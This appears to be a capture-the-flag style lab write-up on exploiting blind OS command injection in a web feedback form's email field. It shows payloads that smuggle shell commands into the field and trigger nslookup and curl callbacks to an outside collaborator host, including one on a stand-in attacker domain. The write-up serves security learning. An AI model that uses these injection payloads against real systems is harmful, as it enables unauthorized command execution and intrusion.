# Blind OS command injection with out-of-band interaction

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666V3ILXF4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T222006Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICkXiWNF42%2BGnT8MU%2FBQs3w9FDEJD6seslTg7aGtr54hAiB3EU2XyQ7opFG73vCKgJt%2F3sE5jJwNVxVIj3g0NfbC%2ByqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMNsNUm9siRqzsKVilKtwDXLXg%2BqouvsX%2BjAaltcSkHF3VSusPdlqtwWgx4k%2BdKjwjpITPzHi6RIPcuGFD%2B9q0Wh7a6Z5gzSzIkEyuPhxFz0875XmkrDfmmdqdr8frfNpo8K4TmI9%2BFGnq%2FetwAgPpa8Ahc7cevB0qR1NZlrmuEx84SWa8C3%2BbY80KTbucuu7sNX0BAyCl%2FIdrcMuro2M4BlAefrHLar3k2xmtDbmBnn5jJidrV%2FoBaI46chKdXuWw%2F581sOl7z0si7wahDvFoA7M61FYgIO8yDao7x1%2FDt08p56ODOZE%2FmOQcUGw6mHmw9nNSCYMZShRS2q%2BWyjmQY2a94Hd1TidXX5EWjaqPef5C2%2F4Z35YKd%2Bg8x9Nvb5HAMvc6GrW%2FNkCxPvqimPdCk9nXFAgWLct48awwXIFCW4TQMag1AOyNjzJBbXJ98zi19BZsC8VSwh0Q2HMxRMovWFlx2Utmbe2N411ef%2FhF4S8stvCamuh8l0HgtIeNgEEEhtVLFUHzv0KYXWzbP5oDccARPQmOSonb6r1G6%2BavB4Ta8K85g15XjzI29k2fjW3E1qzZbmLlPf8vFRvqUTD1CrEF53QIUmWKzxnCTzlzoL3WJ9M4izqsoeio6YXWZrqy27tQXr317ZTkog8w6IOj1AY6pgGs2zgKeaagT9hOOed8pjth6KeYaR92e0QNuzyTNXVb%2FsC8P6ybpruhkjSqxsROj5thkirirQWhTJTcyDB0sxDnOrd2R1FJVax%2BRT%2Byo3SVh5uXqri0d%2BqlbOPcGeAt0QzktmbJqqQpVclFMJpi0yjJ6LITETOB1bWGiCcFNSNjHToqpQTSChtRSLvKDJsmSzfrYofQNVdb814l3bFkNn9%2BxMwbNtej&X-Amz-Signature=37009ba30476840b02065f1e4fc6f0b783b1961727d90544465497f44c8fb9ec&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

> 💡 We can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

```bash
& nslookup kgji2ohoyw.web-attacker.com &

```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/60ea66f9-854a-4130-b9fd-6b6833371b79/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666V3ILXF4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T222006Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICkXiWNF42%2BGnT8MU%2FBQs3w9FDEJD6seslTg7aGtr54hAiB3EU2XyQ7opFG73vCKgJt%2F3sE5jJwNVxVIj3g0NfbC%2ByqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMNsNUm9siRqzsKVilKtwDXLXg%2BqouvsX%2BjAaltcSkHF3VSusPdlqtwWgx4k%2BdKjwjpITPzHi6RIPcuGFD%2B9q0Wh7a6Z5gzSzIkEyuPhxFz0875XmkrDfmmdqdr8frfNpo8K4TmI9%2BFGnq%2FetwAgPpa8Ahc7cevB0qR1NZlrmuEx84SWa8C3%2BbY80KTbucuu7sNX0BAyCl%2FIdrcMuro2M4BlAefrHLar3k2xmtDbmBnn5jJidrV%2FoBaI46chKdXuWw%2F581sOl7z0si7wahDvFoA7M61FYgIO8yDao7x1%2FDt08p56ODOZE%2FmOQcUGw6mHmw9nNSCYMZShRS2q%2BWyjmQY2a94Hd1TidXX5EWjaqPef5C2%2F4Z35YKd%2Bg8x9Nvb5HAMvc6GrW%2FNkCxPvqimPdCk9nXFAgWLct48awwXIFCW4TQMag1AOyNjzJBbXJ98zi19BZsC8VSwh0Q2HMxRMovWFlx2Utmbe2N411ef%2FhF4S8stvCamuh8l0HgtIeNgEEEhtVLFUHzv0KYXWzbP5oDccARPQmOSonb6r1G6%2BavB4Ta8K85g15XjzI29k2fjW3E1qzZbmLlPf8vFRvqUTD1CrEF53QIUmWKzxnCTzlzoL3WJ9M4izqsoeio6YXWZrqy27tQXr317ZTkog8w6IOj1AY6pgGs2zgKeaagT9hOOed8pjth6KeYaR92e0QNuzyTNXVb%2FsC8P6ybpruhkjSqxsROj5thkirirQWhTJTcyDB0sxDnOrd2R1FJVax%2BRT%2Byo3SVh5uXqri0d%2BqlbOPcGeAt0QzktmbJqqQpVclFMJpi0yjJ6LITETOB1bWGiCcFNSNjHToqpQTSChtRSLvKDJsmSzfrYofQNVdb814l3bFkNn9%2BxMwbNtej&X-Amz-Signature=2849aaf1434e8886815ad8a793e937c63c19978451aa4822f96b11d0c377e399&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

**Besides from **`nslookup`**, we can also use **`curl`**:**

`;curl bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;# `

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/b558b3bb-6a70-4cd6-8fe6-c1745e856deb/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666V3ILXF4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T222006Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICkXiWNF42%2BGnT8MU%2FBQs3w9FDEJD6seslTg7aGtr54hAiB3EU2XyQ7opFG73vCKgJt%2F3sE5jJwNVxVIj3g0NfbC%2ByqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMNsNUm9siRqzsKVilKtwDXLXg%2BqouvsX%2BjAaltcSkHF3VSusPdlqtwWgx4k%2BdKjwjpITPzHi6RIPcuGFD%2B9q0Wh7a6Z5gzSzIkEyuPhxFz0875XmkrDfmmdqdr8frfNpo8K4TmI9%2BFGnq%2FetwAgPpa8Ahc7cevB0qR1NZlrmuEx84SWa8C3%2BbY80KTbucuu7sNX0BAyCl%2FIdrcMuro2M4BlAefrHLar3k2xmtDbmBnn5jJidrV%2FoBaI46chKdXuWw%2F581sOl7z0si7wahDvFoA7M61FYgIO8yDao7x1%2FDt08p56ODOZE%2FmOQcUGw6mHmw9nNSCYMZShRS2q%2BWyjmQY2a94Hd1TidXX5EWjaqPef5C2%2F4Z35YKd%2Bg8x9Nvb5HAMvc6GrW%2FNkCxPvqimPdCk9nXFAgWLct48awwXIFCW4TQMag1AOyNjzJBbXJ98zi19BZsC8VSwh0Q2HMxRMovWFlx2Utmbe2N411ef%2FhF4S8stvCamuh8l0HgtIeNgEEEhtVLFUHzv0KYXWzbP5oDccARPQmOSonb6r1G6%2BavB4Ta8K85g15XjzI29k2fjW3E1qzZbmLlPf8vFRvqUTD1CrEF53QIUmWKzxnCTzlzoL3WJ9M4izqsoeio6YXWZrqy27tQXr317ZTkog8w6IOj1AY6pgGs2zgKeaagT9hOOed8pjth6KeYaR92e0QNuzyTNXVb%2FsC8P6ybpruhkjSqxsROj5thkirirQWhTJTcyDB0sxDnOrd2R1FJVax%2BRT%2Byo3SVh5uXqri0d%2BqlbOPcGeAt0QzktmbJqqQpVclFMJpi0yjJ6LITETOB1bWGiCcFNSNjHToqpQTSChtRSLvKDJsmSzfrYofQNVdb814l3bFkNn9%2BxMwbNtej&X-Amz-Signature=b1e82d765990ee2f71070562d5b7601f1bac3116e83bce24bf2c68fb51fbb631&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
